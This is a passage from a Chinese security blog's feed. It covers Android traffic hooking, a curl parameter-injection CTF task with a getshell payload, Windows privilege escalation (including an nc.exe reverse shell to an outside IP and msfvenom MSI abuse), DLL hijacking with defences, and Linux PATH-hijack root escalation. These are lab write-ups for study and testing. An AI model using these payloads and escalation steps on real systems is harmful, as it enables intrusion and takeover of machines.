src="https://s1.ax1x.com/2020/05/10/Y3KLGT.png" alt=""></p><p>两个坑：</p><ul><li>xp框架安装好后重启后发现未激活 - 重启后重新安装 （这里我没遇到）</li><li>xserver安好后激活了模块之后发现还是无法激活 - 重启Android。重启之后还是没用重新安装xp框架</li></ul><p><img src="https://s1.ax1x.com/2020/05/10/Y3M8SS.png" alt=""></p><p>随便安个APP，拿的某音作为测试，打开某音。然后在Xserver选中对应的app<br><img src="https://s1.ax1x.com/2020/05/10/Y3Mq0A.png" alt=""></p><p>adb连接</p><pre><code>adb connect 127.0.0.1:62001adb shell //检查8000端口是否真的打开了adb forward tcp:8000 tcp:8000 //映射到本地的8000端口</code></pre><p><img src="https://s1.ax1x.com/2020/05/10/Y3QrNt.png" alt=""></p><p>访问Sucess的话如下<br><img src="https://s1.ax1x.com/2020/05/10/Y3QWuQ.png" alt=""></p><p>然后可以看到各种module？还是包。不知道该怎么称呼….，随便点开一个可以看到详细信息<br><img src="https://s1.ax1x.com/2020/05/10/Y3Qjb9.png" alt=""></p><p>访问<code>http://127.0.0.1:8000/tracer</code>可以搜索什么函数之类的然后可以Hook<br><img src="https://s1.ax1x.com/2020/05/10/Y3QXDJ.png" alt=""></p><p>搜了个http，然后点击Hook Matched Class可以Hook了，然后刷新一下某音视频就能看到hook了的结果<br><img src="https://s1.ax1x.com/2020/05/10/Y3l3rQ.png" alt=""></p><p>然后就是什么配置Android然后burp抓包看什么的。一般都是通信被加密了，然后通过这种方法来对着看什么什么之类的。没搞过就不说了</p><p><img src="https://s1.ax1x.com/2020/05/10/Y31ZyF.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/10/Y31uw9.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/10/Y31QF1.md.png" alt=""></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://xz.aliyun.com/t/7669" target="_blank" rel="noopener">Xposed+XServer无需脱壳抓取加密包 - 先知社区</a><br><a href="https://blog.csdn.net/nini_boom/article/details/104400619" target="_blank" rel="noopener">使用xserver对某应用进行不脱壳抓加密包_nini_boom的博客-CSDN博客</a><br><a href="https://blog.csdn.net/Fly_hps/article/details/81382442" target="_blank" rel="noopener">夜神模拟器配置burpsuite抓取APP数据报文_网络<em>Fly</em>鹏程万里-CSDN博客</a></p>]]></content>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>bash curl参数注入题目</title>
      <link href="/posts/409da64c.html"/>
      <url>/posts/409da64c.html</url>
      <content type="html"><![CDATA[<p>昨天在星球里，见到P神的题目的答案。研究了一下，顺便复现一下因此有了这篇博文</p><pre><code>昂热并不太相信诅咒这种东西，他是那种要斩破命运的男人，可当他觉察到上杉越和源稚生可能是父子的时候，还是觉得被某种类似命运的东西击中了</code></pre><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><pre><code class="php">&lt;?phpif($_GET[&#39;name&#39;]){        $name=$_GET[&#39;name&#39;];        $command=&quot;curl http://127.0.0.1/test.php?jack=$name&quot;;        echo $command.&quot;&lt;br&gt;&quot;;        system($command);}elseif($_GET[&#39;jack&#39;]){        echo $_GET[&#39;jack&#39;];}else{        echo &quot;Not GET name&quot;;}?&gt;</code></pre><h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><p>request Testing<br><img src="https://s1.ax1x.com/2020/05/01/JOfQYR.png" alt=""></p><p>尝试直接注入命令是不行的<br><img src="https://s1.ax1x.com/2020/05/01/JOfUTH.png" alt=""></p><p>curl <a href="http://127.0.0.1/test.php?jack=$name" target="_blank" rel="noopener">http://127.0.0.1/test.php?jack=$name</a> 的时候<br>执行的时候被当做url了，就是：<a href="http://127.0.0.1/test.php?jack=1&amp;&amp;whoami" target="_blank" rel="noopener">http://127.0.0.1/test.php?jack=1&amp;&amp;whoami</a><br>所以是没有办法直接注入命令然后执行的</p><p>但是当curl ”<a href="http://127.0.0.1/test.php?jack=$name“" target="_blank" rel="noopener">http://127.0.0.1/test.php?jack=$name“</a> 明确的标明了url，就可以直接注入命令</p><p>这时只能通过命令本身的方法来进行操控，通过使用页面下载和代理的方法可以getshell</p><p>使用flask创建个Server</p><pre><code class="python">from flask import Flaskfrom werkzeug.routing import BaseConverterclass RegexConverter(BaseConverter):    def __init__(self, map, *args):        self.map = map        self.regex = args[0]app = Flask(__name__)app.url_map.converters[&#39;regex&#39;] = RegexConverter@app.route(&#39;/&lt;regex(&quot;.*&quot;):url&gt;&#39;)def index(url):    return &quot;&lt;?php phpinfo();?&gt;&quot;if __name__ == &#39;__main__&#39;:    app.run(host=&#39;0.0.0.0&#39;)</code></pre><p>curl -x 说明<br><img src="https://s1.ax1x.com/2020/05/01/JOhwbF.png" alt=""></p><p>payload：</p><pre><code>http://192.168.241.174/test.php?name=phpinfo%20-x%20http://192.168.1.106:5000/%20-o%20jack.php</code></pre><p><img src="https://s1.ax1x.com/2020/05/01/JOhr59.md.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/05/01/JOhcgx.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>米国人的Windows中的特权升级</title>
      <link href="/posts/52bcf532.html"/>
      <url>/posts/52bcf532.html</url>
      <content type="html"><![CDATA[<p>原本前两天要更，和上一篇一样。由于懒鸽到了现在….</p><blockquote><p>只有生在黑暗里的蛾子才会知道黑暗的恐怖<br>飞在阳光里的蝴蝶，永远都不能明白</p></blockquote><h2 id="方法一：winPEAS寻找可提权的地方"><a href="#方法一：winPEAS寻找可提权的地方" class="headerlink" title="方法一：winPEAS寻找可提权的地方"></a>方法一：winPEAS寻找可提权的地方</h2><p>仓库地址：<a href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite" target="_blank" rel="noopener">https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite</a><br><img src="https://s1.ax1x.com/2020/04/29/JTecFA.md.png" alt=""></p><p>也可以用lazagne来收集密码，如果找到一个RDP可连接密码，可以用以下ps1来运行执行命令</p><pre><code>$secpasswd = ConvertTo-SecureString &quot;password321&quot; -AsPlainText -Force$mycreds = New-Object System.Management.Automation.PSCredential (&quot;john&quot;, $secpasswd)$computer = &quot;GHOST&quot;[System.Diagnostics.Process]::Start(&quot;C:\users\public\nc.exe&quot;,&quot;192.168.0.114 4444 -e cmd.exe&quot;, $mycreds.Username, $mycreds.Password, $computer)</code></pre><h2 id="方法二：本地存储的凭证是否有可利用的"><a href="#方法二：本地存储的凭证是否有可利用的" class="headerlink" title="方法二：本地存储的凭证是否有可利用的"></a>方法二：本地存储的凭证是否有可利用的</h2><p>cmdkey /list查询当前存储的凭证<br><img src="https://s1.ax1x.com/2020/04/29/JTeOS0.png" alt=""></p><p>以存储凭证的用户执行command<br>runas /savecred /user:JIUSHI-PC\jiushi “<command>“<br><img src="https://s1.ax1x.com/2020/04/29/JTmt0g.png" alt=""></p><h2 id="方法三：缺少的补丁提权"><a href="#方法三：缺少的补丁提权" class="headerlink" title="方法三：缺少的补丁提权"></a>方法三：缺少的补丁提权</h2><p>检查由于缺少补丁程序而造成的漏洞，使用exp提权<br>windows提权exp地址：<a href="https://github.com/SecWiki/windows-kernel-exploits" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits</a></p><h2 id="方法四：DLL劫持"><a href="#方法四：DLL劫持" class="headerlink" title="方法四：DLL劫持"></a>方法四：DLL劫持</h2><p>windows程序在启动时查找dll。如果这些DLL不存在，则可能通过在应用程序寻找的位置放置恶意DLL来升级特权<br>通常，Windows应用程序将使用预定义的搜索路径来查找DLL，并将按特定的顺序检查这些路径：</p><ol><li>当前程序目录</li><li>C:\Windows\System</li><li>C:\Windows\System32</li><li>当前程序目录</li><li>PATH变量里的路径</li></ol><p>自动搜索DLL劫持工具<br>仓库地址：<a href="https://github.com/itm4n/Ikeext-Privesc" target="_blank" rel="noopener">https://github.com/itm4n/Ikeext-Privesc</a><br><img src="https://s1.ax1x.com/2020/04/29/JTmg74.png" alt=""></p><h2 id="方法五：服务问题"><a href="#方法五：服务问题" class="headerlink" title="方法五：服务问题"></a>方法五：服务问题</h2><p>（1）服务路径没带引号<br>（2）服务路径所指向的可执行文件，可执行文件夹权限可被访问。用于替换exe<br>（3）服务注册表权限<br>（4）脆弱的服务权限，可被更改</p><p>  之前说过，不在重复说明：<a href="https://422926799.github.io/posts/34b370c6.html" target="_blank" rel="noopener">windows配置错误导致的提权 | 九世的博客</a></p><h2 id="方法六：始终安装提升"><a href="#方法六：始终安装提升" class="headerlink" title="方法六：始终安装提升"></a>方法六：始终安装提升</h2><p>Windows可以通过AlwaysInstallElevated组策略允许低特权用户使用系统特权安装Microsoft Windows Installer软件包（MSI）<br><img src="https://s1.ax1x.com/2020/04/29/JTmONd.png" alt=""></p><p>msf create msi</p><pre><code>msfvenom -p windows/x64/exec cmd=calc.exe -f msi -o test.msi</code></pre><p><img src="https://s1.ax1x.com/2020/04/29/JTnFEQ.png" alt=""></p><p>msiexec install</p><pre><code>msiexec /quiet /qn /i &lt;msi.path&gt;反之uninstall msimsiexec /quiet /uninstall &lt;msi.path&gt;</code></pre><p><img src="https://s1.ax1x.com/2020/04/29/JTnJ81.png" alt=""></p><p>Process观察进程可见到是SYSTEM权限运行的<br><img src="https://s1.ax1x.com/2020/04/29/JTntv6.png" alt=""></p><h2 id="方法七：修改的自启运行"><a href="#方法七：修改的自启运行" class="headerlink" title="方法七：修改的自启运行"></a>方法七：修改的自启运行</h2><p>如果可以修改自动运行的路径，因此将文件替换为有效负载。 要以提升的特权执行它，我们需要等待Administrators组中的某人登录。<br><img src="https://s1.ax1x.com/2020/04/29/JTndbD.png" alt=""></p><p>检查各个文件夹的权限</p><pre><code>icacls &quot;&lt;dirpath&gt;&quot;</code></pre><p><img src="https://s1.ax1x.com/2020/04/29/JTncxP.png" alt=""></p><p>当其中一个文件夹有权限可以进行控制的话，生成exe替换掉原有的exe<br><img src="https://s1.ax1x.com/2020/04/29/JTnhVg.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/29/JTn4aQ.md.png" alt=""></p><h2 id="方法八：烂土豆提权（Tater-Hot-Potato）"><a href="#方法八：烂土豆提权（Tater-Hot-Potato）" class="headerlink" title="方法八：烂土豆提权（Tater / Hot Potato）"></a>方法八：烂土豆提权（Tater / Hot Potato）</h2><p>条件限制：<br>1.需要支持SeImpersonate或者SeAssignPrimaryToken权限（通常情况下IIS、MSSQL具有这两个权限）<br>2.开启DCOM本地支持RPC或者远程服务器支持PRC并能成功登录<br>3.能够找到可用的COM对象</p><p>juicy-potato：<a href="https://zhuanlan.zhihu.com/p/113178989" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/113178989</a><br>改进版juicy-potato:<a href="https://www.t00ls.net/viewthread.php?tid=47362&amp;highlight=potato" target="_blank" rel="noopener">https://www.t00ls.net/viewthread.php?tid=47362&amp;highlight=potato</a><br>对应编号：MS16-075 <a href="https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075" target="_blank" rel="noopener">https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS16-075</a></p><h2 id="方法九：第三方服务提权"><a href="#方法九：第三方服务提权" class="headerlink" title="方法九：第三方服务提权"></a>方法九：第三方服务提权</h2><p>通过枚举正在运行的服务，查其权限。看看有什么可以利用的，比如mysql的UDF</p><pre><code>wmic service where started=true get name, startname</code></pre>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>DLL劫持技术总结</title>
      <link href="/posts/fd82243.html"/>
      <url>/posts/fd82243.html</url>
      <content type="html"><![CDATA[<p>原本三天前想写了，因为懒。鸽了好久…</p><blockquote><p>路鸣泽的脸被愤怒所占满，他的黄金瞳照亮了这片黑暗，他狂笑着，他咆哮着，他是疯子，他是君主，他是恶魔，他是被世界遗弃了的神！</p></blockquote><h2 id="DLL的加载方式"><a href="#DLL的加载方式" class="headerlink" title="DLL的加载方式"></a>DLL的加载方式</h2><p>dll的加载方式有：静态加载、动态加载和延迟加载。<br>主要发生在动态加载和延迟加载</p><p>dll劫持是一种技术，而不是漏洞。DLL劫持之前先要了解dll的加载顺序<br><img src="https://s1.ax1x.com/2020/04/29/JTEhyF.png" alt="DLL搜索过程"></p><ol><li>程序所在路径</li><li>C:\Windows\System32</li><li>C:\Windows\System</li><li>C:\Windows</li><li>程序所在路径</li><li>环境变量里的路径寻找</li></ol><p><img src="https://s1.ax1x.com/2020/04/29/JTEzeH.png" alt="环境变量"></p><h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><p>一个简单的DLL加载<br><img src="https://s1.ax1x.com/2020/04/29/JTVCFI.png" alt="正常加载"></p><p>缺少DLL的整个DLL寻找过程（使用Procmon观察）<br><img src="https://s1.ax1x.com/2020/04/29/JTVAl8.png" alt=""></p><p>此时可以生成一个恶意的DLL放到其中的一个路径。就可以进行恶意调用<br><img src="https://s1.ax1x.com/2020/04/29/JTVemQ.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/29/JTVQf0.gif" alt="效果"></p><p><img src="https://s1.ax1x.com/2020/04/29/JTV3lT.png" alt=""></p><h2 id="为什么可以成功劫持？"><a href="#为什么可以成功劫持？" class="headerlink" title="为什么可以成功劫持？"></a>为什么可以成功劫持？</h2><p>msf生成的dll使用了DllEntryPoint函数<br><img src="https://s1.ax1x.com/2020/04/29/JTVGXF.png" alt=""><br>根据API搜索，得出结果</p><blockquote><p>DllEntryPoint函数是进入动态链接库（DLL）的可选方法。 如果使用该函数，则在初始化和终止进程和线程时，或者在调用LoadLibrary和FreeLibrary函数时，系统会调用该函数。 DllEntryPoint是库定义的函数名称的占位符。 实际名称必须在构建时指定。<br><img src="https://s1.ax1x.com/2020/04/29/JTV7ng.png" alt=""></p></blockquote><p>所以使用LoadLibraryA等函数进程DLL调用的时候，通过DllEntryPoint函数重新定义要执行的函数，从而实现执行恶意代码。当不使用LoadLibraryA进行DLL加载的时候（DllEntryPoint函数重新定义要执行的函数）这种方法是无效的。没有办法通过这种方法劫持，只能通过使用IDA分析DLL调用的外部函数（例如静态加载）。或者程序检查DLL的导出函数，是否有加载的函数名，如果没有。则不加载DLL，并效验DLL的md5是否一致</p><h2 id="注意事项"><a href="#注意事项" class="headerlink" title="注意事项"></a>注意事项</h2><p>DLL劫持的时候要注意以下几点（不可取）</p><ol><li>需要重新启动</li><li>文件夹权限拒绝</li></ol><p>以上两点是不可取的，比如将DLL放入C:\Windows\System32是不可取的。压根没权限，实战中毫无作用</p><p>而DLL可以造成提权的原因是：加载DLL使用SYSTEM权限，当DLL可成功劫持的时候即可造成权限提升<br>例如文章作者所述：<br>当一个拥有LocalSystem权限进行启动的服务，执行的进程的DLL可控。如下图所示<br><img src="https://s1.ax1x.com/2020/04/29/JTZV9x.png" alt=""></p><h2 id="防范DLL劫持"><a href="#防范DLL劫持" class="headerlink" title="防范DLL劫持"></a>防范DLL劫持</h2><p>如何防止DLL劫持？<br>使用LoadLibraryEx函数代替LoadLibraryA<br>程序检查DLL的导出函数，是否有加载的函数名，如果没有。则不加载DLL，并效验DLL的md5是否一致</p><p>在LoadLibraryEx里的dwFlags参数使用以下两个方式可以阻止DLL搜索的过程：<br>LOAD_LIBRARY_SEARCH_APPLICATION_DIR<br>LOAD_LIBRARY_SEARCH_SYSTEM32</p><p>LOAD_LIBRARY_SEARCH_APPLICATION_DIR只允许在程序目录进行DLL搜索（通过将程序所在目录的文件夹权限拉高防止劫持）<br><img src="https://s1.ax1x.com/2020/04/29/JTZMHH.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/29/JTZlEd.png" alt=""></p><p>LOAD_LIBRARY_SEARCH_SYSTEM32只允许在C:\Windows\System32进行DLL搜索<br><img src="https://s1.ax1x.com/2020/04/29/JTZGCt.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/29/JTZtv8.png" alt=""></p><p>参考链接：<br><a href="https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa" target="_blank" rel="noopener">https://docs.microsoft.com/en-us/windows/win32/api/libloaderapi/nf-libloaderapi-loadlibraryexa</a> -<br>LoadLibraryEx API<br><a href="https://itm4n.github.io/windows-dll-hijacking-clarified/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">https://itm4n.github.io/windows-dll-hijacking-clarified/?tdsourcetag=s_pctim_aiomsg</a> - Windows DLL Hijacking (Hopefully) Clarified<br><a href="https://zhuanlan.zhihu.com/p/57279354" target="_blank" rel="noopener">https://zhuanlan.zhihu.com/p/57279354</a> - Windows下Dll的加载方式及错误处理</p>]]></content>
      
      
        <tags>
            
            <tag> 红队 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>使用PATH变量的Linux特权升级</title>
      <link href="/posts/ce72e360.html"/>
      <url>/posts/ce72e360.html</url>
      <content type="html"><![CDATA[<p>昨天做HTB的时候遇见了通过环境变量劫持，进行权限提升的操作。今天特地研究了一下<br>原文链接：<a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/?tdsourcetag=s_pctim_aiomsg" target="_blank" rel="noopener">Linux Privilege Escalation Using PATH Variable</a></p><p>使用此操作满足的两个点：<br>1.查询被设置了SUID<br>2.程序调用其他命令的时候没有写绝对路径</p><p>造成这种提权的原因是因为编写程序的时候没有指定绝对路径运行，导致可以通过劫持环境变量来进行劫持操作，一般默认的环境变量有<br>/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games</p><h3 id="Experiment"><a href="#Experiment" class="headerlink" title="Experiment"></a>Experiment</h3><p><strong>Module 1</strong><br>代码如下：</p><pre><code class="c">#include &lt;unistd.h&gt;int main(){  setuid(0);  setgid(0);  system(&quot;ps&quot;);  return 0;}</code></pre><p><img src="https://s1.ax1x.com/2020/04/22/JtFrfx.png" alt=""></p><p>执行以下操作</p><pre><code>echo &quot;whoami&quot; &gt; pschmod 777 psexport PATH=/tmp:$PATH./shell</code></pre><p><img src="https://s1.ax1x.com/2020/04/22/JtF71f.png" alt=""></p><p>执行export后/tmp将在环境变量最前面<br><img src="https://s1.ax1x.com/2020/04/22/Jtk0KS.png" alt=""></p><p>修改成bash则可以获得一个root shell<br><img src="https://s1.ax1x.com/2020/04/22/JtkvrD.png" alt=""></p><p><strong>Module 2</strong><br>代码如下：</p><pre><code class="c">#include &lt;unistd.h&gt;int main(){  setuid(0);  setgid(0);  system(&quot;cat /etc/passwd&quot;);  return 0;}</code></pre><p>执行以下操作</p><pre><code>echo &quot;whoami&quot; &gt; catchmod 777 catexport PATH=/tmp:$PATH./shell</code></pre><p>或者</p><pre><code>vim cat #然后在里面写入/bin/bashchmod 777 catexport PATH=/tmp:$PATH./shell</code></pre><p><img src="https://s1.ax1x.com/2020/04/22/JtAXYn.png" alt=""></p><p><img src="https://s1.ax1x.com/2020/04/22/JtEEf1.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Hack the box Magic</title>
      <link href="/posts/e8feabea.html"/>
      <url>/posts/e8feabea.html</url>
      <content type="html"><![CDATA[<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><div id="hbe-security">  <div class="hbe-input-container">  <input type="password" class="hbe-form-control" id="pass" placeholder="Please enter the password to read the blog." />    <label for="pass">Please enter the password to read the blog.</label>    <div class="bottom-line"></div>  </div></div><div id="decryptionError" style="display: none;">Incorrect Password!</div><div id="noContentError" style="display: none;">No content to display!</div><div id="encrypt-blog" style="display:none">U2FsdGVkX19Ak7hYad+2R1F7c8hJm9stCcdVTduhftOxR5T3DEapwtYSWwxiShRP8TeCuSgEUOA7ZnAZFOHHz1CPV3V9zJOXGSaXvG4UwM8KpG82pHC/uEKGaprTCaExFWHTgK+O81F7pae2hbHrvEqK/2+859wc6+wwxEk0nbI+zPEP4qLoEEgIuc0CohjVKQgsWPXhtFfl8dvCq65xiwH8P1vFr9vAiKlJzFrhX9S/Wj8az0RkZwKskvT8lVwm1tEw3T6yQOqWenoj9mEuekZUhLjSGgodfk29LWB2lXLtyDrGWHSRJHdNaFEW5QjQHUKxTOw1+qNB9XnHP5UAPi28zjWBbodD9dwmHC5IRn5QOsn1u/WU7vhr7Fid+xQTtODg8qFS60misZyxpQy2gSJlh05iTL9Ffhn05bUHZxy1OPhyccE4WOIdk7Y5AfcgOeXpSkgs+DIAN+1qPkLLjYwgwtjyc3uIn1MBZ44ND4WGjS2HvfT0Jnu87Uw2UqLzgMNKNRlyJXe6Ij7/NpiPSIPsOvZYq9WEOmK4ueVMDXI/PRw4bT4U6ARNF2Y5EInmQu14H7FcWX08/0z+cGiwmFUtKsTd8X9szltWpt1wnyW1N0b3gDn/YBsjqQcW8VvgqaYT/jH7id8Y8fQqaod9q9Orihfdj9NkTyyfkxG1PPN/jkc9G0/6MOIilmIBSdFSopBu8OlXLj5DTPmVHR6JVcGrCVueBDsjVXiGySY2VXuU7veN/lzZrirwTwBOI4doaWcnkKmioNT4n01oVEJC9KMljEVEOHxd1EbrrqLO+ZfKnYRyyqf07VNnFYqqkk3eSWj6H9QLE67MWecV/FzfoW4JvMDa1DRge+f3lKRpr0FFPvjgZ8d6Xq7LYcQqoVoGf9vUstgA0LidpLtQhEdFpt4/eHecwX0OvefpXsZqx7lQIHiTLWyWBcrDH/LD1BGHxUGtdZT+IugXF4qLZOmviEklBBG5eDg0wHQ5KQzBEXoAzYMjbrcjMI7gtksnrylFWrz3uAbKdd9zlW1nS8HWt8mmQhsGjzQPDbFu89i9D5Hb2Ks3Fas/Qhht8z1mKS9mZEQyOTSulaFlgqle626zPt/Ch592nbnOO/o6C2/SW32W+u5T+53VG0xsj5PvwYQyAaAbRTQiCUVZkUr1//LnQ6P+ksKgUSWfd8b8ZB0f4X5l9UEAVkMzr6qxATB7WHYKay/ZvqF7I5sDdVkGO4zoNeNIgXuRvaGhZibWotg0ErHGsuaGE6xYVRl2IordM1L9iaOopNhkTTs+dyJ2V8AKmF3k4L2GGSalvh7G8i0htpXC4JHjQgDg9PiniE+gnuAFDGiiNEv3Zbckwfh889NxGt5vWfG05yV6horM75u1GV87CrZouk+qiOykLH1Iad4yi21V9Q2+O4puPzSFXNqOznTE86kmjBw731JtEpzCJMq950du31T/6IccsOmDunuuWh7hCMdZHulgpmpHNknpGGuxuE5+UaKXI2+d1KUrhcC9QqmZlmgzHcVfE9cMX+OjOS/sfl/IM9XU2E23fDfyvCD1FgvN4Gh29PwLslnLvUleVGJhyLK8aGT/iDg/dnnQvWm7zBfMHwueSMDdBykhcKM+kxnpKcs5Rs/EzFiezeoFqzU2s3aht4x11JoWgDGLenZBEupYfIuE5U+N7pvZvlK3T3SWO3JQmul4I4u1CHI5QxruFVYSY48JcMZBTdbBz6jcope71vSFy4QKycGjWrBxsBYI0oIP78rvnetVlBja+VA/ppUt1KLlD6kZ5TeUrL1pCxRqF+lQHZJlspVnBVoJkbxbRfhx1dLMe1PMqnJBTYurRtBXxvZcl9pP+q3n7vI53QzwyMAYy35V5S511gtNxvacVYN51681VhSGoKbhnZWR5VY1NblPQE+HjRYBSfQtbi11QSDww6hA+XMEdcqz/gc6Srq71Dgy1c8opvBEOXf6KwN2wFCLi/6xN2lQqAjUEodgvf7ru2dBtOgXYcgCWXoNTPFzQ9UMdIalK46A7pTElRi29WZ+0zzW+mWdv/EM90bmbiyyJcLEGazpP39qbNNwQ8tRnKphty4XB4m1yHGsq9X6sO0sLDJCWC1Mewh+UlXSbcrQKVtVSVLtwDglwbOkNu+aEn1isY2yT/w9MJppUvAUhRg6nXlevkP0Bi3MokSFe6qoIbhFHlk0jZIVH3Ns4SEpjTM0KxCDRH3yqnBcUOCXqMzS7/t3RZevFmaqbEURWbDtrVLuZz9TaWYLroPY3HGufPH9cI0TTZMEqW58fA7q/W2RigofCByFo0YNTqaV6A4e+q7Y6QGSmrehL8ywD3W80l4Ku+t+8NnylK2DOuL9Do1r7twQlN0o6iDkfH7qCyGVWyGuKRpTE15gvKfxUDjgsaTmiBNFDFg6FQ+u/m9/6GzFLKh711e1X9EQracOPh4UedFlu1atw+6jOWmLwtJGRgfXLfxvY2nFxs/vby0iXnKbnDbvDoWFvVO/uZUHsSztHa5ScZ8SxMhgz85D3gMkHACA3pOYw+11YDRDxeSLJryQyq7wuoI3esCbLCIDZv2x6W/q8QCQ+4lPEf3T/lJzBO2cu2vhytvmKX8l9Q1a5sCw0voPB8RZ60pTGvZe4Gc1ysCxl6dLEKpCahjzpx6m5oPBmIscCpmHriN+SwXprkzOHHm9+IIOm18i4FUVzrzq7J5/sOFoYilJc8PLnbkdyB7UkM7Vrq0tJHA+oZK/aOh6qtJ1IzDJ/ZePzmbFOWr9O44hIcM668QjuPvfGcmrWJoahiKI1LgPgXqeqGX6fBbSCicHBvcyXBTnTTRlkzPb+wFu73S1tLkcgdWGjj++v/kdJxGLvE6SMu0hGDJ8b9HeeMabiOipVlSVGoc3YvjZTx619BDDOkdoC8QuzkkazEQ5oRetgWvR1kUS3F5+C4mxtXLWd5oSQscV0NT30SVL1kJwpl3fIr1VnGDBcMo18v+y6k7jSbOniCCXyrAoGNeL5Y829qMmPr97IlKZTOZN1DXqa2MkJH8z6HV4zLMPnz7FnYZlBjw2lCmtaiPS0jaHxwHxcWl5mxpywfeiEq57fJzvbbTtJJ5sVcQB99n43dLDfKqbuAooJ3fL3GOK8S6Ki2YCIhuSeE53NxUYzEUg5nQIm1IhDRMhTSDOo/esoqjDUeG9exM2EIB9U+AtNfFBjLED79Dy10lkyU8b4Yl0WMwNnnvzX+Mkm/UPAKjC1zjpL4Z8Q+BjxvgSLCCC+yV2krBggXtKaOznayZIzZyJLpmICS09JSR86QxaN+u9hllRrKMbHSW3ISyI4WlI4GYYwg6UupZ96XPIZOLx8TR9WHJ+nMLDXZelQSroNZgc5AgKI1lGs8zRnyINVv3Do2dwKCHoGPNc7f5HbdSxKTDTeUp+wBcWYy4OT5jRHDfgA800yPPOYiPxLObOH8kVrkRIWs3A60JhpmItOhF5pngjtzvdGB/svQG+yMcPOPKyBPyzrcdhmb/6eS0HKYtuiklYgpQR6BkXNtM9d5Jr/dQg50VlX9G7oT7N48kcHqlrzwN7h4b3mPvussUCxZ2O79Kk9JBy1M985oZSIAbUdJUFyt/kU9P4b42f+CBJ7PhnLMA1QfIikptnt2HyWR/G0SfX4wnYHNnBrlH9dbdVucUZeMSa0OJ6gTWD6ZasXyo8tr996PrizOcMhiEP6v6C7mvIorvSn41ZiotJa85Pq9wRrbNTgUq7SRYbihTUQ/UU3ELyuJwQyjgxUEUUK9piFy7JLNFBhNu3mCuHChDNjtFRiepdO/bxNrBthYawwzbnKvCT9f4nyTUESIvXd3cWoDb2bFsF39oSY0dfR/fiUS5pWGTDzqUL7ZpDDUUqPxuGoitXbM7pJoGjkpAWXl0ph8mfMVcXGznC3//pj6Q/qBmymbp71F0smgR6DetRgdUxYlXtsyr+M3EOgIO3rrhQCxCxHx7qI+89B5TLpZNoxBTExybp7BukwZSdJC02M6kOJkfdS34FlJr68vunRycgYPHOPO23wC8ohuNx9Jw05bonLCVPLp6s0dPuebRLmaKuLurgJgHsabmEY8gHLAMMRpgXCehISRH6aSpyg2h5dgO+73tjXUH4w9RpG4mQSiJP5RkEjMilSzgDCbulIMMdmEuodX8GRhIlSnr7dcfWoKUVh/0G7HRElLr20S5fO0e717T9/Alhl9VgWh8b25hyRFp+fd6dnZ4UgS+xTjtp5p+giDM9Hwj83RMzXxnzDcrmDdM0K6IOWlilq0fYSJIKRzdF0wZo6l3FIiNuw6hTN8YRtuNLF6IkXjpfFijX3KQ7T6KDuMmZlqdFI2oK1WAriQILwPxRQv0W/6E8i12UQZFkZFFCT/d3IU6JI0y7I0v4U+bh7NapKB4GZqQDZiuyoNk1reCuUn4ctVaohQ8Mj7osPE28eeXWvHWhz7n0su+9nwOYgXTyIlxZkzLGHdvli1gdUVgfGZ+HRhc8uvjRAlyGDR72kWZw+kPdEfqX6aq4OQyIzEuDDqcLJTeFjt9JBy0e6POcfZa2HwGjQg2rgZXwx06mT25U8ItzJAznHLyv+lz/JsLIBfALrhh88wr5zBaq8GzSeYSy1D9p7xG56XgoYYOufCtdszRpR4/wAoULr781i1YH6Wm7srtZ5BohBA+r85E9tG7iv1Q8ncbncMAwka1St3+v175uzGnCuIXlfR+02qOv4YsX7bfWr6ilpARiPE7m38/Y4eS3NibrDfh0KtKgqpMV577IvCGO1eXGjbry1o/NWW+33Ss7OfuK8GEzOpciCsUEJpwc7pr4cp3UpQO83UPYmv+48SVw52jXLB/oOuD4asmynEe+BF68Xaa73yIVrBic1yizpKLZLOcX3qQt9H6uFEBKftSa+ULIN9HwgbHq/eMFXSbAC/sIZ2cZ5VKD79dVn9b0Q2h+SegEinH6OgrokuBWBwkzGelYcJGOHPduI7s5z+7U6EM9wMdL2ZyOF5d+xzs2ApccjMT85spwz6neMGemWXhdU1mfntoncPHiYZGOOqAKUlYPXqQ/+1AftB9tFORLXtfHWI8r+wGGAXwF+WizBzdU2+RGfR0kRZ/AiRQo3YNs443ndR6c7+3Dqnin8t9RkcAGNW1yK6q318xwlzkmoBhGvgYabsE3M+/970RWD6oRxvuVP7OXU3egkbHlz96eP+Fe2YaTjTwmOQFKSB9Xc1VmEKDhAyRzhveVCTmDOSXgKZPDRXqAYvNJeKRXC2Yuy35w8WoZsxZf3s96JK+qEJcKSkI92bJkiICHwoZ2n/dXWV06n+wjmJP3DOHH6GTPEJN02kG6z3dph7BFiWTPA3JnNzoOkEaN6FGh2/NPTIujt1Eg0